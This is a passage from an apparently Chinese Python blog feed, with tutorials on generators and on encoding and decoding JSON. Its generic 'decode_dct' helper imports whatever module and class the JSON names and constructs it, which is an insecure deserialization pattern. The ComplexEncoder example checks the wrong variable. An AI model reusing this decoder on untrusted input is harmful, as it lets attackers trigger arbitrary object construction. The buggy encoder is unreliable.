class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Starting&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这不会打印 &#x27;Starting&#x27;</span></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这会打印 &#x27;Starting&#x27; 以及第一个值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会打印第二个值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这会引发 StopIteration</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">StopIteration                             Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">1</span>-3941498e0bf0&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">     <span class="number">16</span> </span><br><span class="line">     <span class="number">17</span> <span class="comment"># this will raise a StopIteration</span></span><br><span class="line">---&gt; <span class="number">18</span> <span class="built_in">print</span>(<span class="built_in">next</span>(cd))</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 你可以使用 for 循环来遍历一个生成器对象</span></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cd:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 你可以将其用于接受可迭代对象作为输入的函数</span></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line">sum_cd = <span class="built_in">sum</span>(cd)</span><br><span class="line"><span class="built_in">print</span>(sum_cd)</span><br><span class="line"></span><br><span class="line">cd = countdown(<span class="number">3</span>)</span><br><span class="line">sorted_cd = <span class="built_in">sorted</span>(cd)</span><br><span class="line"><span class="built_in">print</span>(sorted_cd)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line"><span class="number">6</span></span><br><span class="line">Starting</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>最大的优点：迭代器节省内存！</p><p>由于这些值是延迟生成的，即仅在需要时才生成，因此可以节省大量内存，尤其是在处理大数据时。 此外，我们不必等到所有元素生成后再开始使用它们。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果没有生成器，则必须将完整序列存储在此处的列表中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">firstn</span>(<span class="params">n</span>):</span><br><span class="line">    num, nums = <span class="number">0</span>, []</span><br><span class="line">    <span class="keyword">while</span> num &lt; n:</span><br><span class="line">        nums.append(num)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line"></span><br><span class="line">sum_of_first_n = <span class="built_in">sum</span>(firstn(<span class="number">1000000</span>))</span><br><span class="line"><span class="built_in">print</span>(sum_of_first_n)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(firstn(<span class="number">1000000</span>)), <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">499999500000</span></span><br><span class="line"><span class="number">8697464</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用生成器，不需要额外的序列来存储数字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">firstn</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; n:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">sum_of_first_n = <span class="built_in">sum</span>(firstn(<span class="number">1000000</span>))</span><br><span class="line"><span class="built_in">print</span>(sum_of_first_n)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(firstn(<span class="number">1000000</span>)), <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">499999500000</span></span><br><span class="line"><span class="number">120</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><h3><span id="ling-yi-ge-li-zi-fei-bo-na-qi-shu-lie">另一个例子：斐波那契数列</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">limit</span>):</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span> <span class="comment"># 前两个数</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; limit:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line"></span><br><span class="line">fib = fibonacci(<span class="number">30</span>)</span><br><span class="line"><span class="comment"># 生成器对象可以被转为列表（这儿只是用来打印）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(fib))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>]</span><br></pre></td></tr></table></figure><h3><span id="sheng-cheng-qi-biao-da-shi">生成器表达式</span></h3><p>就像列表推导一样，生成器可以用相同的语法编写，除了用括号代替方括号。 注意不要混淆它们，因为由于函数调用的开销，生成器表达式通常比列表理解要慢（<a href="https://stackoverflow.com/questions/11964130/list-comprehension-vs-generator-expressions-weird-timeit-results/11964478#11964478">https://stackoverflow.com/questions/11964130/list-comprehension-vs-generator-expressions-weird-timeit-results/11964478#11964478</a>）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成器表达式</span></span><br><span class="line">mygenerator = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(mygenerator), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表推导式</span></span><br><span class="line">mylist = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(mylist), <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">120</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">4272</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><h3><span id="sheng-cheng-qi-bei-hou-de-gai-nian">生成器背后的概念</span></h3><p>这个类将生成器实现为可迭代的对象。 它必须实现 <code>__iter__</code> 和 <code>__next__</code> 使其可迭代，跟踪当前状态（在这种情况下为当前数字），并注意 <code>StopIteration</code>。 它可以用来理解生成器背后的概念。 但是，有很多样板代码，其逻辑并不像使用 <code>yield</code> 关键字的简单函数那样清晰。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">firstn</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n</span>):</span><br><span class="line">        self.n = n</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.num &lt; self.n:</span><br><span class="line">            cur = self.num</span><br><span class="line">            self.num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> cur</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration()</span><br><span class="line">             </span><br><span class="line">firstn_object = firstn(<span class="number">1000000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>(firstn_object))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">499999500000</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      14. 生成器 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>11. JSON — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-138/"/>
    <id>https://qiwihui.com/qiwihui-blog-138/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>JSON（JavaScript对象表示法）是一种轻量级数据格式，用于数据交换。 在Python中具有用于编码和解码JSON数据的内置 <code>json</code> 模块。 只需导入它，就可以使用JSON数据了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure><p>JSON的一些优点：</p><ul><li>JSON作为“字节序列”存在，在我们需要通过网络传输（流）数据的情况下非常有用。</li><li>与XML相比，JSON小得多，可转化为更快的数据传输和更好的体验。</li><li>JSON非常文本友好，因为它是文本形式的，并且同时也是机器友好的。</li></ul><span id="more"></span><h2><span id="json-ge-shi">JSON格式</span></h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jane&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lastName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hobbies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="string">&quot;swimming&quot;</span><span class="punctuation">,</span> <span class="string">&quot;singing&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">28</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;children&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Bob&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">7</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JSON支持基本类型（字符串，数字，布尔值）以及嵌套的数组和对象。 根据以下转换，将简单的Python对象转换为JSON：</p><p><a href="https://www.notion.so/c16eeb7ba08841a3bbfc63c268bcfe54">Python 和 JSON 转换</a></p><h2><span id="cong-python-dao-json-xu-lie-hua-bian-ma">从Python到JSON（序列化，编码）</span></h2><p>使用 <code>json.dumps()</code> 方法将Python对象转换为JSON字符串。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">person = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>, <span class="string">&quot;hasChildren&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;titles&quot;</span>: [<span class="string">&quot;engineer&quot;</span>, <span class="string">&quot;programmer&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为 JSON:</span></span><br><span class="line">person_json = json.dumps(person)</span><br><span class="line"><span class="comment"># 使用不用的格式</span></span><br><span class="line">person_json2 = json.dumps(person, indent=<span class="number">4</span>, separators=(<span class="string">&quot;; &quot;</span>, <span class="string">&quot;= &quot;</span>), sort_keys=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果为 JSON 字符串</span></span><br><span class="line"><span class="built_in">print</span>(person_json) </span><br><span class="line"><span class="built_in">print</span>(person_json2)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>, <span class="string">&quot;hasChildren&quot;</span>: false, <span class="string">&quot;titles&quot;</span>:[<span class="string">&quot;engineer&quot;</span>, <span class="string">&quot;programmer&quot;</span>]&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span>= <span class="number">30</span>; </span><br><span class="line">    <span class="string">&quot;city&quot;</span>= <span class="string">&quot;New York&quot;</span>; </span><br><span class="line">    <span class="string">&quot;hasChildren&quot;</span>= false; </span><br><span class="line">    <span class="string">&quot;name&quot;</span>= <span class="string">&quot;John&quot;</span>; </span><br><span class="line">    <span class="string">&quot;titles&quot;</span>= [</span><br><span class="line">        <span class="string">&quot;engineer&quot;</span>; </span><br><span class="line">        <span class="string">&quot;programmer&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或将Python对象转换为JSON对象，然后使用 <code>json.dump()</code> 方法将其保存到文件中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">person = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>, <span class="string">&quot;hasChildren&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;titles&quot;</span>: [<span class="string">&quot;engineer&quot;</span>, <span class="string">&quot;programmer&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;person.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(person, f) <span class="comment"># 你也可以设置缩进等</span></span><br></pre></td></tr></table></figure><h2><span id="cong-json-dao-python-fan-xu-lie-hua-jie-ma">从JSON到Python（反序列化，解码）</span></h2><p>使用 <code>json.loads()</code> 方法将JSON字符串转换为Python对象。 结果将是一个Python字典。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">person_json = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;age&quot;: 30, </span></span><br><span class="line"><span class="string">    &quot;city&quot;: &quot;New York&quot;,</span></span><br><span class="line"><span class="string">    &quot;hasChildren&quot;: false, </span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;John&quot;,</span></span><br><span class="line"><span class="string">    &quot;titles&quot;: [</span></span><br><span class="line"><span class="string">        &quot;engineer&quot;,</span></span><br><span class="line"><span class="string">        &quot;programmer&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">person = json.loads(person_json)</span><br><span class="line"><span class="built_in">print</span>(person)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;hasChildren&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;titles&#x27;</span>: [<span class="string">&#x27;engineer&#x27;</span>, <span class="string">&#x27;programmer&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><p>或从文件加载数据，然后使用 <code>json.load()</code>方法将其转换为Python对象。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;person.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    person = json.load(f)</span><br><span class="line">    <span class="built_in">print</span>(person)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;hasChildren&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;titles&#x27;</span>: [<span class="string">&#x27;engineer&#x27;</span>, <span class="string">&#x27;programmer&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><h2><span id="shi-yong-zi-ding-yi-dui-xiang">使用自定义对象</span></h2><h3><span id="bian-ma">编码</span></h3><p>使用默认的 <code>JSONEncoder</code> 编码自定义对象将引发 <code>TypeError</code>。 我们可以指定一个自定义的编码函数，该函数将类名和所有对象变量存储在字典中。 将此函数用作 <code>json.dump()</code> 方法中的 <code>default</code> 参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_complex</span>(<span class="params">z</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(z, <span class="built_in">complex</span>):</span><br><span class="line">        <span class="comment"># 只是类名的键很重要，值可以是任意的。</span></span><br><span class="line">        <span class="keyword">return</span> &#123;z.__class__.__name__: <span class="literal">True</span>, <span class="string">&quot;real&quot;</span>:z.real, <span class="string">&quot;imag&quot;</span>:z.imag&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Object of type &#x27;<span class="subst">&#123;z.__class__.__name__&#125;</span>&#x27; is not JSON serializable&quot;</span>)</span><br><span class="line"></span><br><span class="line">z = <span class="number">5</span> + <span class="number">9j</span></span><br><span class="line">zJSON = json.dumps(z, default=encode_complex)</span><br><span class="line"><span class="built_in">print</span>(zJSON)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;complex&quot;</span>: true, <span class="string">&quot;real&quot;</span>: <span class="number">5.0</span>, <span class="string">&quot;imag&quot;</span>: <span class="number">9.0</span>&#125;</span><br></pre></td></tr></table></figure><p>你还可以创建一个自定义的 Encoder 类，并覆盖 <code>default()</code> 方法。 将其用于 <code>json.dump()</code> 方法中的 <code>cls</code> 参数，或直接使用编码器。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONEncoder</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ComplexEncoder</span>(<span class="title class_ inherited__">JSONEncoder</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">default</span>(<span class="params">self, o</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(z, <span class="built_in">complex</span>):</span><br><span class="line">            <span class="keyword">return</span> &#123;z.__class__.__name__: <span class="literal">True</span>, <span class="string">&quot;real&quot;</span>:z.real, <span class="string">&quot;imag&quot;</span>:z.imag&#125;</span><br><span class="line">        <span class="comment"># 让基类的默认方法处理其他对象或引发TypeError</span></span><br><span class="line">        <span class="keyword">return</span> JSONEncoder.default(self, o)</span><br><span class="line">    </span><br><span class="line">z = <span class="number">5</span> + <span class="number">9j</span></span><br><span class="line">zJSON = json.dumps(z, cls=ComplexEncoder)</span><br><span class="line"><span class="built_in">print</span>(zJSON)</span><br><span class="line"><span class="comment"># 或者直接使用编码器</span></span><br><span class="line">zJson = ComplexEncoder().encode(z)</span><br><span class="line"><span class="built_in">print</span>(zJSON)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;complex&quot;</span>: true, <span class="string">&quot;real&quot;</span>: <span class="number">5.0</span>, <span class="string">&quot;imag&quot;</span>: <span class="number">9.0</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;complex&quot;</span>: true, <span class="string">&quot;real&quot;</span>: <span class="number">5.0</span>, <span class="string">&quot;imag&quot;</span>: <span class="number">9.0</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="jie-ma">解码</span></h3><p>可以使用默认 JSONDecoder 解码自定义对象，但是它将被解码为字典。 编写一个自定义解码函数，该函数将以字典作为输入，并在可以在字典中找到对象类名称的情况下创建自定义对象。 将此函数用于 <code>json.load()</code> 方法中的 <code>object_hook</code> 参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可能但解码为字典</span></span><br><span class="line">z = json.loads(zJSON)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(z))</span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_complex</span>(<span class="params">dct</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">complex</span>.__name__ <span class="keyword">in</span> dct:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">complex</span>(dct[<span class="string">&quot;real&quot;</span>], dct[<span class="string">&quot;imag&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> dct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在，对象在解码后的类型为complex</span></span><br><span class="line">z = json.loads(zJSON, object_hook=decode_complex)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(z))</span><br><span class="line"><span class="built_in">print</span>(z)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&#123;<span class="string">&#x27;complex&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;real&#x27;</span>: <span class="number">5.0</span>, <span class="string">&#x27;imag&#x27;</span>: <span class="number">9.0</span>&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;</span><br><span class="line">(<span class="number">5</span>+<span class="number">9j</span>)</span><br></pre></td></tr></table></figure><h2><span id="mo-ban-bian-ma-he-jie-ma-han-shu">模板编码和解码函数</span></h2><p>如果在 <code>__init__</code> 方法中提供了所有类变量，则此方法适用于所有自定义类。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line"><span class="comment"># 自定义类在 __init__() 中包含所有类变量</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, active, balance, friends</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.active = active</span><br><span class="line">        self.balance = balance</span><br><span class="line">        self.friends = friends</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span>:</span><br><span class="line">    <span class="comment"># 其他自定义类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, nickname, level</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.nickname = nickname</span><br><span class="line">        self.level = level</span><br><span class="line">          </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_obj</span>(<span class="params">obj</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    接受一个自定义对象，并返回该对象的字典表示形式。 此字典表示形式还包括对象的模块和类名称。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 用对象元数据填充字典</span></span><br><span class="line">    obj_dict = &#123;</span><br><span class="line">      <span class="string">&quot;__class__&quot;</span>: obj.__class__.__name__,</span><br><span class="line">      <span class="string">&quot;__module__&quot;</span>: obj.__module__</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 用对象属性填充字典</span></span><br><span class="line">    obj_dict.update(obj.__dict__)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> obj_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_dct</span>(<span class="params">dct</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    接受字典并返回与该字典关联的自定义对象。</span></span><br><span class="line"><span class="string">    它利用字典中的 &quot;__module__&quot; 和 &quot;__class__&quot; 元数据来了解要创建的对象类型。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;__class__&quot;</span> <span class="keyword">in</span> dct:</span><br><span class="line">        <span class="comment"># Pop ensures we remove metadata from the dict to leave only the instance arguments</span></span><br><span class="line">        class_name = dct.pop(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get the module name from the dict and import it</span></span><br><span class="line">        module_name = dct.pop(<span class="string">&quot;__module__&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># We use the built in __import__ function since the module name is not yet known at runtime</span></span><br><span class="line">        module = <span class="built_in">__import__</span>(module_name)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get the class from the module</span></span><br><span class="line">        class_ = <span class="built_in">getattr</span>(module,class_name)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Use dictionary unpacking to initialize the object</span></span><br><span class="line">        <span class="comment"># Note: This only works if all __init__() arguments of the class are exactly the dict keys</span></span><br><span class="line">        obj = class_(**dct)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        obj = dct</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line"><span class="comment"># User 类适用于我们的编码和解码方法</span></span><br><span class="line">user = User(name = <span class="string">&quot;John&quot;</span>,age = <span class="number">28</span>, friends = [<span class="string">&quot;Jane&quot;</span>, <span class="string">&quot;Tom&quot;</span>], balance = <span class="number">20.70</span>, active = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">userJSON = json.dumps(user,default=encode_obj,indent=<span class="number">4</span>, sort_keys=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(userJSON)</span><br><span class="line"></span><br><span class="line">user_decoded = json.loads(userJSON, object_hook=decode_dct)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(user_decoded))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Player 类也适用于我们的编码和解码方法</span></span><br><span class="line">player = Player(<span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;max1234&#x27;</span>, <span class="number">5</span>)</span><br><span class="line">playerJSON = json.dumps(player,default=encode_obj,indent=<span class="number">4</span>, sort_keys=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(playerJSON)</span><br><span class="line"></span><br><span class="line">player_decoded = json.loads(playerJSON, object_hook=decode_dct)</span><br><span class="line"><span class="built_in">print</span>(<span 